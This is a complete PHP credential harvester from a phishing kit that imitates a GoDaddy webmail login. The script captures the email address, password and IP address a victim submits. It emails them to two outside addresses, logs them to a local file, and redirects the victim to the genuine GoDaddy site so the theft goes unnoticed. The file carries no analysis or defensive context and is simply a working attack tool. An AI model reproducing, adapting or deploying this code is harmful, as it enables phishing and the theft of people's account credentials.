<?

$ip = getenv("REMOTE_ADDR");
$message .= "----------LOGZ--------------------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Voyage---------------------\n";
$send = "mark.mcgraw111@gmail.com,mark.mcgraw111@yandex.com";
$subject = "GoD4DDY ReZulTs / .$ip";
$headers = "From: Voyage<logzz@eduz.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$fp = fopen("error_log.txt","a");
fputs($fp,$message);
mail("$send", "$subject", $message); 
header("Location: https://email.godaddy.com");
	  

?>